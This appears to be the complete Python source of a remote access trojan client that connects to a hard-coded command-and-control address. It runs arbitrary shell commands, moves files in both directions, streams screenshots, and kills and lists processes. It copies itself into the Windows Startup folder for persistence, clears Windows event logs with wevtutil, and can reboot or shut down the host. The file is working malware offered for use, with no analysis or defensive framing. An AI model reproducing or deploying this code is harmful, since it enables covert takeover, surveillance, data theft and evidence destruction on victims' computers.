import socket
import os
import subprocess
import pyautogui
import time
import shutil
import ctypes

def send_screenshare(client_socket):
    """Capture and send screen to the C2 server."""
    try:
        while True:
            screenshot = pyautogui.screenshot()
            screenshot_bytes = screenshot.tobytes()
            client_socket.sendall(screenshot_bytes)
            time.sleep(0.1)  # Adjust frame rate if needed
    except Exception as e:
        print(f"[!] Error during screenshare: {e}")

def enable_persistence():
    """Enable persistence on the target system."""
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    if not os.path.exists(startup_path):
        os.makedirs(startup_path)
    shutil.copy(script_path, os.path.join(startup_path, os.path.basename(script_path)))
    return "Persistence enabled."

def execute_command(command):
    """Execute a shell command."""
    result = subprocess.getoutput(command)
    return result

def wipe_event_logs():
    """Wipe event logs on the target system."""
    if os.name == 'nt':
        subprocess.call(["wevtutil", "clear-log", "Application"])
        subprocess.call(["wevtutil", "clear-log", "System"])
        return "Event logs cleared."
    else:
        return "Event log clearing only supported on Windows."

def reboot_system():
    """Reboot the target system."""
    if os.name == 'nt':
        subprocess.call(["shutdown", "/r", "/t", "0"])
    else:
        subprocess.call(["sudo", "reboot"])

def shutdown_system():
    """Shut down the target system."""
    if os.name == 'nt':
        subprocess.call(["shutdown", "/s", "/t", "0"])
    else:
        subprocess.call(["sudo", "shutdown", "now"])

# Main client loop
def client_loop(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print(f"[*] Connected to C2 server at {server_ip}:{server_port}")

    while True:
        try:
            command = client.recv(4096).decode()
            if command.lower() == "exit":
                print("[*] Exiting...")
                client.close()
                break
            elif command.lower() == "screenshare":
                send_screenshare(client)
            elif command.lower().startswith("upload"):
                _, file_path, *dest = command.split()
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        client.send(f.read())
            elif command.lower().startswith("download"):
                _, file_path = command.split()
                with open(file_path, 'wb') as f:
                    f.write(client.recv(4096))
            elif command.lower().startswith("kill"):
                _, pid = command.split()
                os.kill(int(pid), 9)
            elif command.lower() == "ps":
                processes = subprocess.getoutput("tasklist" if os.name == "nt" else "ps aux")
                client.send(processes.encode())
            elif command.lower().startswith("run"):
                _, file_path = command.split()
                subprocess.Popen(file_path, shell=True)
            elif command.lower().startswith("shell"):
                _, *dest = command.split()
                os.chdir(dest[0] if dest else os.getcwd())
                client.send(b"Shell started.")
            elif command.lower() == "persist":
                client.send(enable_persistence().encode())
            elif command.lower() == "clearev":
                client.send(wipe_event_logs().encode())
            elif command.lower() == "reboot":
                reboot_system()
            elif command.lower() == "shutdown":
                shutdown_system()
            elif command.lower() == "help":
                help_text = """
Available Commands:
- upload <filename> -d <destination>: Upload a file to the client.
- download <filename>: Download a file from the client.
- kill <pid>: Kill a process by its PID.
- ps: List all processes.
- run <filename>: Execute a file on the client.
- shell [-d <path>]: Start a shell session; optionally specify a path.
- persist: Enable persistence on the client system.
- clearev: Clear event logs on the client system.
- reboot: Reboot the client system.
- shutdown: Shut down the client system.
- screenshare: Start a live screen-sharing session.
- help: Show this help text.
"""
                client.send(help_text.encode())
            else:
                result = execute_command(command)
                client.send(result.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            client.close()
            break

if __name__ == "__main__":
    SERVER_IP = "10.0.1.37"
    SERVER_PORT = 9999
    client_loop(SERVER_IP, SERVER_PORT)
